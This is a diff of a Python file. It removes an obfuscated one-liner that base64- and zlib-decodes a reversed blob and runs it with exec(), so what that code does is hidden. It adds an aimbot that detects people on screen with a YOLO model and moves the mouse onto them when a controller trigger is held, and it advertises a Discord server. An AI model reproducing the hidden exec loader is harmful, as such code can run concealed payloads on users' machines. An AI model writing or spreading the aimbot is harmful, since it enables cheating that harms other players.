@@ -1,2 +1,161 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+from ultralytics import YOLO
+import bettercam
+import numpy as np
+import ctypes
+import torch
+import pygame
+import os
+
+pygame.init()
+axis = pygame.joystick.Joystick(0)
+pygame.joystick.init()
+axis.init()
+
+os.system("cls")
+
+try:
+ pass
+
+ mouse_event = ctypes.windll.user32.mouse_event
+ print("""
+     \033[1;35m v16 """)
+ print("\n\033[0m[\033[1;34mINFO\033[0m] Loaded")
+ print("[\033[48;5;208m\033[97mJOIN DISCORD\033[0m] https://discord.gg/Mkntgqrx\n")
+
+ print("\n[\033[45m\033[97mREAD\033[0m] The Lower The Res The Faster But Worse Close Range Less Screen Pixels Can't See**\n")
+ print("[x] Recommended \033[1;36m[\033[0;36m1\033[0m] 160x160")
+ print("\033[1;36m[\033[1;33m\033[0;36m2\033[0m] 256x256")
+ print("\033[1;36m[\033[1;33m\033[0;36m3\033[0m] 320x320")
+ print("\033[1;36m[\033[1;33m\033[0;36m4\033[0m] 224x224")
+ print("\033[1;36m[\033[1;33m\033[0;36m5\033[0m] 192x192")
+ print("\033[1;36m[\033[1;33m\033[0;36m6\033[0m] 384x384")
+ print("\033[1;36m[\033[1;33m\033[0;36m7\033[0m] 128x128")
+
+ res = input("\nPick A Res >> ")
+ 
+ if res == "1":
+    CAPTURE_SIZE = 160
+ if res == "2":
+    CAPTURE_SIZE = 256
+ if res == "3":
+    CAPTURE_SIZE = 320
+ if res == "4":
+    CAPTURE_SIZE = 224
+ if res == "5":
+    CAPTURE_SIZE = 192
+ if res == "6":
+    CAPTURE_SIZE = 384
+ if res == "7":
+    CAPTURE_SIZE = 128
+
+
+ FULL_CENTER_X = 960
+ FULL_CENTER_Y = 540
+
+
+ REL_CENTER_X = CAPTURE_SIZE 
+ REL_CENTER_Y = CAPTURE_SIZE 
+
+ REGION = (
+    FULL_CENTER_X - REL_CENTER_X,  
+    FULL_CENTER_Y - REL_CENTER_Y, 
+    FULL_CENTER_X + REL_CENTER_X,  
+    FULL_CENTER_Y + REL_CENTER_Y,  
+)
+
+ CAMERA = bettercam.create(
+    output_idx=0,
+    output_color="BGR",
+    region=REGION
+)
+ print("\n[\033[45m\033[95mREAD\033[0m] The Higher The Strength The Slower But Way Less False Positives, The Lower More Speed But More False Positives \n")
+ print("[x] Recommended \033[1;33m[1]\033[1;36m 0.4")
+ print("\033[1;33m[2]\033[1;36m 0.45")
+ print("\033[1;33m[3]\033[1;36m 0.5")
+ print("\033[1;33m[4]\033[1;36m 0.55")
+ print("\033[1;33m[5]\033[1;36m 0.6")
+ print("\033[1;33m[6]\033[1;36m 0.65")
+ print("\033[1;33m[7]\033[1;36m 0.7")
+ print("\033[1;33m[8]\033[1;36m 0.75")
+ print("\033[1;33m[9]\033[1;36m 0.8")
+ 
+ value = input("\n\033[0mFilter >> ")
+ if value == "1":
+    value=0.4
+ if value == "2":
+    value=0.45
+ if value == "3":
+    value=0.5
+ if value == "4":
+    value=0.55
+ if value == "5":
+    value=0.6
+ if value == "6":
+    value=0.65
+ if value == "7":
+    value=0.7
+ if value == "8":
+    value=0.75
+ if value == "9":
+    value=0.8
+
+ class PersonDetector:
+    def __init__(self, model_path):
+        self.model = YOLO(model_path)
+
+
+    def detect_person(self, img):
+        img = np.ascontiguousarray(img)
+        results = self.model(
+            img,
+            classes=[0],           
+            conf=value,           
+            imgsz=CAPTURE_SIZE,    
+            device=0,           
+            verbose=False,
+        )
+        if not results or not len(results[0].boxes):
+            return []
+
+        return results[0].boxes.xyxy 
+
+ def grab():
+    frame = CAMERA.grab()
+    if frame is None:
+        return np.array([])
+    return frame  
+
+ def main():
+    detector = PersonDetector(r"C:\Program Files\v\best.pt")
+
+    VERTICAL_AIM_FACTOR = 0.25  
+
+    while True:
+        img = grab()
+        if img.size == 0:
+            continue
+
+        boxes = detector.detect_person(img)
+        if len(boxes) == 0:
+            continue
+
+        if torch.is_tensor(boxes):
+            boxes = boxes.cpu().numpy()
+            
+        x1, y1, x2, y2 = boxes[0]
+
+        cx = (x1 + x2) / 2
+        h = y2 - y1
+        cy = y1 + h * VERTICAL_AIM_FACTOR
+
+        dx = int(cx - REL_CENTER_X)
+        dy = int(cy - REL_CENTER_Y)
+        
+        pygame.event.pump()
+        if axis.get_axis(4) > 0.0:
+         mouse_event(0x0001, dx, dy)
+
+except Exception as file_err:
+    print("Error Please Reinstall from the install.exe or Plug in controller")
+
+main()
